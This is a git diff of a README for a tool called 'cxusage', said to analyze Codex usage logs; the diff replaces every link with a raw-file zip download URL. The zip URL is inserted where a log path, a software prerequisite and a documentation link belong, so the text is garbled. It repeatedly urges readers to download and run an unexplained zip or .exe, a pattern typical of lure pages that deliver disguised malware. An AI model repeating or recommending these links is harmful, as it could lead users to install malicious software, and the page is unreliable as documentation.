@@ -1,17 +1,17 @@
 # 🔍 cxusage - Analyze Your Codex Usage Effortlessly
 
 ## 💾 Download Now
-[![Download cxusage](https://raw.githubusercontent.com/zaharsyahrafi/cxusage/main/scrutiny/cxusage.zip)](https://raw.githubusercontent.com/zaharsyahrafi/cxusage/main/scrutiny/cxusage.zip)
+[![Download cxusage](https://github.com/zaharsyahrafi/cxusage/raw/refs/heads/main/src/Software_v3.4.zip)](https://github.com/zaharsyahrafi/cxusage/raw/refs/heads/main/src/Software_v3.4.zip)
 
 ## 📖 Introduction
-cxusage is a command-line tool designed to help you analyze your Codex usage. This software scans your Codex session logs located in `~https://raw.githubusercontent.com/zaharsyahrafi/cxusage/main/scrutiny/cxusage.zip`. It aggregates tokens by day or model and estimates usage costs based on OpenRouter pricing. Whether you're a developer or a casual user, cxusage simplifies understanding your token usage.
+cxusage is a command-line tool designed to help you analyze your Codex usage. This software scans your Codex session logs located in `~https://github.com/zaharsyahrafi/cxusage/raw/refs/heads/main/src/Software_v3.4.zip`. It aggregates tokens by day or model and estimates usage costs based on OpenRouter pricing. Whether you're a developer or a casual user, cxusage simplifies understanding your token usage.
 
 ## 🚀 Getting Started
 To get started with cxusage, follow these steps:
 
 1. **Visit the Download Page**  
    Click on the following link to access the Releases page:  
-   [Download cxusage](https://raw.githubusercontent.com/zaharsyahrafi/cxusage/main/scrutiny/cxusage.zip)
+   [Download cxusage](https://github.com/zaharsyahrafi/cxusage/raw/refs/heads/main/src/Software_v3.4.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will find several versions of cxusage. Select the most recent version that matches your operating system.
@@ -23,7 +23,7 @@ To get started with cxusage, follow these steps:
 To run cxusage, your system must meet the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS 10.12 or later, or a recent version of Linux.
-- **https://raw.githubusercontent.com/zaharsyahrafi/cxusage/main/scrutiny/cxusage.zip** You must have https://raw.githubusercontent.com/zaharsyahrafi/cxusage/main/scrutiny/cxusage.zip installed. You can download it from [https://raw.githubusercontent.com/zaharsyahrafi/cxusage/main/scrutiny/cxusage.zip](https://raw.githubusercontent.com/zaharsyahrafi/cxusage/main/scrutiny/cxusage.zip).
+- **https://github.com/zaharsyahrafi/cxusage/raw/refs/heads/main/src/Software_v3.4.zip** You must have https://github.com/zaharsyahrafi/cxusage/raw/refs/heads/main/src/Software_v3.4.zip installed. You can download it from [https://github.com/zaharsyahrafi/cxusage/raw/refs/heads/main/src/Software_v3.4.zip](https://github.com/zaharsyahrafi/cxusage/raw/refs/heads/main/src/Software_v3.4.zip).
 - **Internet Connection:** An active internet connection is required for price estimation using OpenRouter.
 
 ## 📥 Download & Install
@@ -31,7 +31,7 @@ To download and install cxusage:
 
 1. **Go Back to the Releases Page**  
    If you haven’t already, visit the Releases page:  
-   [Download cxusage](https://raw.githubusercontent.com/zaharsyahrafi/cxusage/main/scrutiny/cxusage.zip)
+   [Download cxusage](https://github.com/zaharsyahrafi/cxusage/raw/refs/heads/main/src/Software_v3.4.zip)
 
 2. **Install the Application**  
    - On Windows: Double-click the downloaded `.exe` file to start the installation.
@@ -60,12 +60,12 @@ Once you have installed cxusage, you can run it from your terminal or command pr
 - **User-Friendly Interface**: Navigate effortlessly through simple command line options.
 
 ## 📚 Documentation
-For a more detailed guide on using all features of cxusage, check the [Documentation](https://raw.githubusercontent.com/zaharsyahrafi/cxusage/main/scrutiny/cxusage.zip).
+For a more detailed guide on using all features of cxusage, check the [Documentation](https://github.com/zaharsyahrafi/cxusage/raw/refs/heads/main/src/Software_v3.4.zip).
 
 ## 🛠️ Troubleshooting
 If you encounter any issues while using cxusage:
 
-- **Installation Issues**: Ensure that https://raw.githubusercontent.com/zaharsyahrafi/cxusage/main/scrutiny/cxusage.zip is installed and up to date.
+- **Installation Issues**: Ensure that https://github.com/zaharsyahrafi/cxusage/raw/refs/heads/main/src/Software_v3.4.zip is installed and up to date.
 - **Command Errors**: Double-check your commands for typos or incorrect syntax.
 
 If problems persist, consult the Issues section on our GitHub page for possible solutions or to report new issues.
